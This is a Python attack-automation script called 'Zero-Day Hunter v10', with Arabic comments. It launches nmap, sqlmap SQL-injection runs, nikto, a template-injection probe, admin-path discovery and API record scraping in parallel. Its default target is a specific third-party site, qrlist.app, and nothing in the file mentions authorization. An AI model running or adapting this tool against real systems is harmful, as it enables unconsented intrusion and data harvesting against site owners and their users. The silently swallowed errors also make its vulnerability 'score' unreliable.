#!/usr/bin/env python3
"""
🚀 Zero-Day Hunter v10 - Ultimate Integration
يجمع: Python + SQLMap + Nikto + Nmap + Gobuster
"""
import requests, sys, json, os, re, socket, subprocess, time
from datetime import datetime
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

class ZeroDayV10:
    def __init__(self, target):
        self.target = target
        self.domain = urlparse(target).netloc
        self.results = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "dns": {}, "ports": [], "paths": [], "vulns": [],
            "apis": [], "keys": [], "emails": [], "score": 0
        }
        self.session = requests.Session()
        self.start = time.time()
    
    def log(self, msg): print(f"[🚀] {msg}")
    
    def phase1_nmap(self):
        """Nmap سريع"""
        self.log("🔌 Nmap...")
        try:
            r = subprocess.run(["nmap","-p","1-1000","--open","-T4",self.domain],
                             capture_output=True, text=True, timeout=30)
            ports = re.findall(r'(\d+)/tcp\s+open', r.stdout)
            self.results["ports"] = [int(p) for p in ports]
            self.log(f"   {len(ports)} ports: {ports}")
        except: pass
    
    def phase2_sqlmap(self):
        """SQLMap تلقائي"""
        self.log("💉 SQLMap...")
        try:
            r = subprocess.run(["sqlmap","-u",f"{self.target}/api/stores?id=1","--batch","--level=1","--risk=1"],
                             capture_output=True, text=True, timeout=30)
            if "vulnerable" in r.stdout.lower():
                self.results["vulns"].append("SQL Injection")
                self.log("   🚨 SQLi!")
        except: pass
    
    def phase3_nikto(self):
        """Nikto"""
        self.log("🔍 Nikto...")
        try:
            r = subprocess.run(["nikto","-h",self.target,"-Tuning","1","-timeout","10"],
                             capture_output=True, text=True, timeout=30)
            if "cloudflare" in r.stdout.lower():
                self.results["waf"] = "Cloudflare"
                self.log("   🛡️ Cloudflare detected")
        except: pass
    
    def phase4_python(self):
        """Python - SSTI + API"""
        self.log("🐍 Python...")
        try:
            # SSTI
            r = self.session.get(f"{self.target}/api/stores?q={{{{7*7}}}}", timeout=5)
            if "49" in r.text:
                self.results["vulns"].append("SSTI")
                self.log("   🚨 SSTI")
            
            # API
            r2 = self.session.get(f"{self.target}/api/stores", timeout=5)
            if r2.status_code == 200 and len(r2.text) > 100:
                try:
                    data = r2.json()
                    stores = data.get('data', data) if isinstance(data, dict) else data
                    if isinstance(stores, list):
                        self.results["api_stores"] = len(stores)
                        self.log(f"   📊 {len(stores)} stores via API")
                except: pass
            
            # Admin
            for p in ["/admin","/admin/login"]:
                r3 = self.session.get(f"{self.target}{p}", timeout=5, allow_redirects=False)
                if r3.status_code in [200,302]:
                    self.results["paths"].append(p)
        except: pass
    
    def run(self):
        self.log(f"🚀 v10: {self.target}")
        
        # DNS
        try:
            self.results["dns"]["ip"] = socket.gethostbyname(self.domain)
        except: pass
        
        # كل شي بالتوازي
        with ThreadPoolExecutor(max_workers=4) as ex:
            ex.submit(self.phase1_nmap)
            ex.submit(self.phase2_sqlmap)
            ex.submit(self.phase3_nikto)
            ex.submit(self.phase4_python)
        
        # Score
        score = 0
        score += len(self.results["ports"]) * 3
        score += len(self.results["vulns"]) * 20
        score += len(self.results["paths"]) * 10
        score += self.results.get("api_stores",0) * 3
        self.results["score"] = min(score, 100)
        
        elapsed = time.time() - self.start
        
        self.log(f"\n⏱️ {elapsed:.1f}s | Score: {self.results['score']}/100")
        self.log(f"   📡 IP: {self.results['dns'].get('ip','?')}")
        self.log(f"   🔌 Ports: {self.results['ports']}")
        self.log(f"   🚨 Vulns: {self.results['vulns']}")
        self.log(f"   🛡️ WAF: {self.results.get('waf','None')}")
        
        # حفظ
        os.makedirs("logs/zeroday", exist_ok=True)
        fname = f"logs/zeroday/v10_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fname, 'w') as f:
            json.dump(self.results, f, indent=2)
        self.log(f"📁 {fname}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://qrlist.app"
    ZeroDayV10(target).run()
